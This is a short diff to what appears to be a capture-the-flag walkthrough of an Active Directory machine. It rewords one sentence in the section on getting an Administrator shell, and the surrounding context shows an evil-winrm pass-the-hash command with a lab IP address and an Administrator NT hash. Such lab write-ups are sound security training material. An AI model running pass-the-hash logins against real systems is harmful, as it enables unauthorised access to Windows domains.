@@ -1147,7 +1147,7 @@ Certipy gets that hash by requesting a Kerberos ticket to itself and reading the
 
 ## Shell as Administrator (root.txt)
 
-NTLM authenticates with the hash itself, so there is nothing left to crack. We pass it over WinRM.
+We log in to DC-404 over WinRM with `Administrator`'s NT hash.
 
 ```
 evil-winrm -i '10.1.143.161' -u 'administrator' -H 'a6019e48da8f602a60c30a6f0136d792'
